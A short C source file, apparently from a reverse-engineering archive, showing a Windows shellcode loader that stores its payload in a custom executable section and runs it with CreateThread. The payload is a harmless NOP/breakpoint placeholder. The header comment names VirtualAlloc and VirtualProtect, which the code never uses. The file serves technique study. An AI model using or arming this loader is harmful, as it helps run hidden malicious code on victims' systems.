/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload as separate section

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

// create new executable section
#pragma section(".code",execute,read)
_declspec(allocate(".code")) 
uint8_t payload[] = { 0x90, 0x90, 0xCC, 0xC3 };


int main ()
{
    HANDLE  th_shellcode;
    void *  runtime = payload;

    // execute shellcode directly from section
    th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
    WaitForSingleObject (th_shellcode, -1);

    return 0;
}